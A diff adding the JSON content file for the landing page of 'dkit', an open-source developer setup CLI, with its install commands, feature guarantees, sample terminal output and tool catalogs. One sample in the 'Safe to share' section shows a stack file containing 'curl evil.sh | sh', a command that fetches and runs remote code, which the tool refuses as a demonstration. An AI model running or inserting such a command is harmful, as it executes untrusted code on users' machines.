@@ -1,0 +1,598 @@
+{
+  "hero": {
+    "eyebrow": "# open source developer setup kit",
+    "title": [
+      "New laptop?",
+      "Ready in minutes."
+    ],
+    "text": "dkit installs your tools, scaffolds full-stack projects and moves your entire dev environment to a new PC or OS, including between Windows, macOS and Linux. It plans first, asks you to confirm, then acts.",
+    "install": {
+      "npm": "npm install -g devsetupkit-cli",
+      "pnpm": "pnpm add -g devsetupkit-cli",
+      "yarn": "yarn global add devsetupkit-cli",
+      "bun": "bun add -g devsetupkit-cli"
+    },
+    "note": "Needs Node.js 20+. Installs the dkit command. Free and MIT licensed."
+  },
+  "stats": [
+    [
+      24,
+      "tools supported"
+    ],
+    [
+      19,
+      "project libraries"
+    ],
+    [
+      12,
+      "ready-made stacks"
+    ],
+    [
+      3,
+      "operating systems"
+    ],
+    [
+      1,
+      "command to start"
+    ]
+  ],
+  "problem": {
+    "eyebrow": "# the problem",
+    "title": "Every new machine is a weekend lost.",
+    "text": "Different installers per OS, forgotten extensions, lost dotfiles. dkit replaces the checklist with one repeatable command.",
+    "comparison": [
+      {
+        "task": "Install tools",
+        "byHand": "Look up winget, brew or apt for each one",
+        "withDkit": "dkit install git node docker"
+      },
+      {
+        "task": "Editor extensions",
+        "byHand": "Reinstall one by one, from memory",
+        "withDkit": "Restored from one backup"
+      },
+      {
+        "task": "Git, SSH and shell config",
+        "byHand": "Copy dotfiles and hope nothing is missing",
+        "withDkit": "dkit migrate restore"
+      },
+      {
+        "task": "Switch OS",
+        "byHand": "Rewrite your setup for Windows, macOS or Linux",
+        "withDkit": "Same backup, the new OS's installer"
+      },
+      {
+        "task": "Onboard a teammate",
+        "byHand": "A wiki page that went stale",
+        "withDkit": "dkit team add <repo>"
+      },
+      {
+        "task": "Keep two PCs the same",
+        "byHand": "Redo every change on each machine",
+        "withDkit": "dkit sync pull"
+      },
+      {
+        "task": "Know what you have",
+        "byHand": "Memory",
+        "withDkit": "dkit doctor"
+      }
+    ]
+  },
+  "why": {
+    "eyebrow": "# why dkit",
+    "title": "Built for people who dislike surprises.",
+    "text": "Every change is planned, shown and confirmed before it happens. Pick a guarantee to see it in action.",
+    "guarantees": [
+      {
+        "title": "Plan, confirm, act",
+        "text": "Every change is previewed first. Use --dry-run to see the plan, then approve.",
+        "terminal": "$ dkit install docker --dry-run\nplan\n  ○ turn on Virtual Machine Platform  admin prompt\n  ○ install WSL 2                     admin prompt\n  ○ install Docker Desktop            winget\n✓ nothing was changed. Run without --dry-run to apply."
+      },
+      {
+        "title": "One setup, any OS",
+        "text": "The same manifest works on Windows, macOS and Linux.",
+        "terminal": "# on Windows\n$ dkit scan -o dkit-manifest.json\n# on the new Mac\n$ dkit status dkit-manifest.json\n✓ git   ✓ node   ✓ vscode\n✗ docker  missing, will install with brew\n? install what is missing? (y/N)"
+      },
+      {
+        "title": "Encrypted backups",
+        "text": "AES-256-GCM. Secrets removed, SSH keys never exported.",
+        "terminal": "$ dkit migrate inspect backup.dkit\n✓ AES-256-GCM, checksums match\nsecrets   <REDACTED>\nssh keys  never exported\n# someone edits the file...\n$ dkit migrate restore backup.dkit\n✗ backup is damaged or tampered. Refusing to restore."
+      },
+      {
+        "title": "Team onboarding",
+        "text": "A new teammate runs two commands and has the team's tools.",
+        "terminal": "$ dkit team add https://github.com/acme/dev-setup\n✓ connected to \"Acme web team\"\n$ dkit team status\nbaseline  node, git, docker, postgresql\n✓ git   ✗ docker   ✗ postgresql\n? install what is missing? (y/N)"
+      },
+      {
+        "title": "Safe to share",
+        "text": "Stacks and team files can only name catalog items, never commands.",
+        "terminal": "# a stack file from a stranger\n{ \"tools\": [\"node\"], \"run\": \"curl evil.sh | sh\" }\n$ dkit stack install ./shared.json\n✗ refused: stack files may only list catalog ids.\nnothing was run."
+      },
+      {
+        "title": "Open source",
+        "text": "MIT licensed. Add a tool with one catalog entry.",
+        "terminal": "# src/core/catalog.ts\n{ id: \"mytool\", name: \"My Tool\",\n  kind: \"tool\", detect, install }\n$ dkit info mytool\n✓ My Tool: winget · brew · apt\nlicense MIT · pull requests welcome"
+      }
+    ]
+  },
+  "terminal": [
+    {
+      "command": "dkit doctor"
+    },
+    {
+      "output": "✓ git 2.47   ✓ node 22   ✗ docker"
+    },
+    {
+      "command": "dkit install docker"
+    },
+    {
+      "output": "plan: enable WSL 2, install Docker Desktop"
+    },
+    {
+      "prompt": "? continue? (y/N) ",
+      "answer": "y"
+    },
+    {
+      "output": "✓ docker installed and verified"
+    },
+    {
+      "command": "dkit diagnose"
+    },
+    {
+      "output": "↑ postman 11.18 → 11.20   ✓ no problems"
+    },
+    {
+      "command": "dkit update postman"
+    },
+    {
+      "output": "✓ postman updated"
+    },
+    {
+      "command": "dkit migrate export"
+    },
+    {
+      "output": "✓ backup.dkit written (encrypted)"
+    }
+  ],
+  "categories": [
+    {
+      "name": "Essentials",
+      "ids": [
+        "git",
+        "git-bash",
+        "openssh",
+        "gh"
+      ]
+    },
+    {
+      "name": "Languages",
+      "ids": [
+        "node",
+        "python",
+        "pnpm",
+        "yarn",
+        "bun",
+        "go",
+        "flutter"
+      ]
+    },
+    {
+      "name": "Editors & AI",
+      "ids": [
+        "vscode",
+        "antigravity",
+        "claude",
+        "codex"
+      ]
+    },
+    {
+      "name": "Databases",
+      "ids": [
+        "postgresql",
+        "pgadmin",
+        "mongodb",
+        "compass",
+        "redis"
+      ]
+    },
+    {
+      "name": "Dev tools",
+      "ids": [
+        "docker",
+        "postman",
+        "prettier",
+        "eslint"
+      ]
+    }
+  ],
+  "descriptions": {
+    "git": "Version control",
+    "git-bash": "Bash shell on Windows",
+    "openssh": "Remote access, keys",
+    "gh": "GitHub from the terminal",
+    "node": "JavaScript runtime + npm",
+    "python": "Python + pip, venv",
+    "pnpm": "Fast package manager",
+    "yarn": "Package manager",
+    "bun": "All-in-one JS runtime",
+    "vscode": "Code editor",
+    "antigravity": "AI-first editor",
+    "claude": "AI coding in the terminal",
+    "codex": "OpenAI coding agent",
+    "postgresql": "PostgreSQL 17",
+    "pgadmin": "PostgreSQL admin UI",
+    "mongodb": "Document database",
+    "compass": "MongoDB GUI",
+    "docker": "Containers",
+    "postman": "API client",
+    "prettier": "Code formatter",
+    "eslint": "JavaScript linter",
+    "go": "Go toolchain",
+    "flutter": "Apps from one codebase",
+    "redis": "Cache and queues"
+  },
+  "libraries": [
+    {
+      "id": "hono",
+      "adds": "hono"
+    },
+    {
+      "id": "express",
+      "adds": "express, @types/express"
+    },
+    {
+      "id": "better-auth",
+      "adds": "better-auth"
+    },
+    {
+      "id": "kysely",
+      "adds": "kysely"
+    },
+    {
+      "id": "pg",
+      "adds": "pg, @types/pg"
+    },
+    {
+      "id": "drizzle",
+      "adds": "drizzle-orm, drizzle-kit"
+    },
+    {
+      "id": "prisma",
+      "adds": "@prisma/client, prisma"
+    },
+    {
+      "id": "dbmate",
+      "adds": "dbmate"
+    },
+    {
+      "id": "ioredis",
+      "adds": "ioredis"
+    },
+    {
+      "id": "stripe",
+      "adds": "stripe"
+    },
+    {
+      "id": "resend",
+      "adds": "resend"
+    },
+    {
+      "id": "fastapi",
+      "adds": "Python · fastapi[standard]"
+    },
+    {
+      "id": "sqlalchemy",
+      "adds": "Python · sqlalchemy"
+    },
+    {
+      "id": "psycopg",
+      "adds": "Python · psycopg[binary]"
+    },
+    {
+      "id": "gin",
+      "adds": "Go · gin-gonic/gin"
+    },
+    {
+      "id": "pgx",
+      "adds": "Go · jackc/pgx"
+    },
+    {
+      "id": "go-redis",
+      "adds": "Go · redis/go-redis"
+    },
+    {
+      "id": "flutter-bloc",
+      "adds": "Flutter · flutter_bloc"
+    },
+    {
+      "id": "get-it",
+      "adds": "Flutter · get_it"
+    }
+  ],
+  "tools": [
+    {
+      "id": "git",
+      "name": "Git",
+      "windows": "winget",
+      "macos": "brew",
+      "linux": "apt"
+    },
+    {
+      "id": "git-bash",
+      "name": "Git Bash",
+      "windows": "comes with Git",
+      "macos": "built in",
+      "linux": "built in"
+    },
+    {
+      "id": "openssh",
+      "name": "OpenSSH",
+      "windows": "Windows feature (admin prompt)",
+      "macos": "built in",
+      "linux": "apt"
+    },
+    {
+      "id": "gh",
+      "name": "GitHub CLI",
+      "windows": "winget",
+      "macos": "brew",
+      "linux": "apt"
+    },
+    {
+      "id": "node",
+      "name": "Node.js + npm",
+      "windows": "winget (LTS)",
+      "macos": "brew",
+      "linux": "apt"
+    },
+    {
+      "id": "python",
+      "name": "Python",
+      "windows": "winget (3.13)",
+      "macos": "brew",
+      "linux": "apt (+pip, venv)"
+    },
+    {
+      "id": "pnpm",
+      "name": "pnpm",
+      "windows": "npm -g",
+      "macos": "npm -g",
+      "linux": "npm -g"
+    },
+    {
+      "id": "yarn",
+      "name": "Yarn",
+      "windows": "npm -g",
+      "macos": "npm -g",
+      "linux": "npm -g"
+    },
+    {
+      "id": "bun",
+      "name": "Bun",
+      "windows": "winget",
+      "macos": "brew",
+      "linux": "official script"
+    },
+    {
+      "id": "go",
+      "name": "Go",
+      "windows": "winget",
+      "macos": "brew",
+      "linux": "apt (golang-go)"
+    },
+    {
+      "id": "flutter",
+      "name": "Flutter",
+      "windows": "manual (official SDK)",
+      "macos": "brew cask",
+      "linux": "manual (official SDK)"
+    },
+    {
+      "id": "vscode",
+      "name": "VS Code",
+      "windows": "winget",
+      "macos": "brew cask",
+      "linux": "manual download"
+    },
+    {
+      "id": "antigravity",
+      "name": "Antigravity",
+      "windows": "winget",
+      "macos": "manual",
+      "linux": "manual"
+    },
+    {
+      "id": "claude",
+      "name": "Claude Code",
+      "windows": "official script",
+      "macos": "official script",
+      "linux": "official script"
+    },
+    {
+      "id": "codex",
+      "name": "Codex CLI",
+      "windows": "npm -g",
+      "macos": "npm -g",
+      "linux": "npm -g"
+    },
+    {
+      "id": "postgresql",
+      "name": "PostgreSQL 17",
+      "windows": "winget",
+      "macos": "brew",
+      "linux": "apt"
+    },
+    {
+      "id": "pgadmin",
+      "name": "pgAdmin",
+      "windows": "winget",
+      "macos": "brew cask",
+      "linux": "manual"
+    },
+    {
+      "id": "mongodb",
+      "name": "MongoDB",
+      "windows": "winget",
+      "macos": "brew",
+      "linux": "manual"
+    },
+    {
+      "id": "compass",
+      "name": "MongoDB Compass",
+      "windows": "winget",
+      "macos": "brew cask",
+      "linux": "manual"
+    },
+    {
+      "id": "redis",
+      "name": "Redis",
+      "windows": "winget (Memurai)",
+      "macos": "brew",
+      "linux": "apt (redis-server)"
+    },
+    {
+      "id": "docker",
+      "name": "Docker",
+      "windows": "winget (Docker Desktop)",
+      "macos": "brew cask",
+      "linux": "apt (docker.io)"
+    },
+    {
+      "id": "postman",
+      "name": "Postman",
+      "windows": "winget",
+      "macos": "brew cask",
+      "linux": "manual"
+    },
+    {
+      "id": "prettier",
+      "name": "Prettier",
+      "windows": "npm -g",
+      "macos": "npm -g",
+      "linux": "npm -g"
+    },
+    {
+      "id": "eslint",
+      "name": "ESLint",
+      "windows": "npm -g",
+      "macos": "npm -g",
+      "linux": "npm -g"
+    }
+  ],
+  "stacksSection": {
+    "eyebrow": "# stacks",
+    "title": "A whole project in one command.",
+    "text": "Tools, the framework's official starter and your libraries, together.",
+    "command": "dkit stack install next-hono --project web",
+    "steps": [
+      [
+        "Tools",
+        "Installs Node.js and PostgreSQL if they are missing."
+      ],
+      [
+        "Starter",
+        "Runs the framework's official starter, no prompts."
+      ],
+      [
+        "Libraries",
+        "Adds Hono, Better Auth, Drizzle and pg with your package manager."
+      ]
+    ]
+  },
+  "movingSection": {
+    "eyebrow": "# moving",
+    "title": "Switch machines without starting over.",
+    "text": "Export once, restore anywhere. Windows to macOS to Linux.",
+    "parts": [
+      [
+        "tools",
+        "Reinstalled with the new OS's installer"
+      ],
+      [
+        "editors",
+        "VS Code and Antigravity extensions, settings, snippets"
+      ],
+      [
+        "git",
+        "Global config and gitignore"
+      ],
+      [
+        "claude",
+        "Settings, commands, skills, MCP servers"
+      ],
+      [
+        "npm",
+        "Global packages"
+      ],
+      [
+        "ssh",
+        "Config only"
+      ],
+      [
+        "shell",
+        "PowerShell, .bashrc or .zshrc, converted"
+      ],
+      [
+        "apps",
+        "Other winget apps, none preselected"
+      ]
+    ],
+    "never": "SSH private keys · logins · Claude credentials · chat history · database data"
+  },
+  "jobs": {
+    "eyebrow": "# what it does",
+    "title": "Eight jobs, one tool.",
+    "text": "Each has its own page with every command and option.",
+    "cards": [
+      [
+        "install",
+        "Install tools",
+        "Install and check 24 tools, per OS"
+      ],
+      [
+        "maintain",
+        "Diagnose & update",
+        "Find problems, update and remove tools"
+      ],
+      [
+        "stacks",
+        "Stacks",
+        "12 ready-made stacks: JS, Python, Go, Flutter"
+      ],
+      [
+        "manifest",
+        "Scan & compare",
+        "Describe a setup, compare PCs"
+      ],
+      [
+        "migrate",
+        "Migrate",
+        "Encrypted backup, restore anywhere"
+      ],
+      [
+        "team",
+        "Team setup",
+        "One repo onboards a teammate"
+      ],
+      [
+        "snapshots",
+        "Snapshots",
+        "Scheduled encrypted backups"
+      ],
+      [
+        "sync",
+        "Sync PCs",
+        "Keep PCs in step via your cloud folder"
+      ]
+    ]
+  },
+  "toolsSection": {
+    "eyebrow": "# supported tools",
+    "title": "Everything you need, ready to install.",
+    "text": "24 machine tools and 19 project libraries. Hover a row to pause it."
+  },
+  "cta": {
+    "eyebrow": "# get started",
+    "title": "Set up your next machine in minutes."
+  }
+}
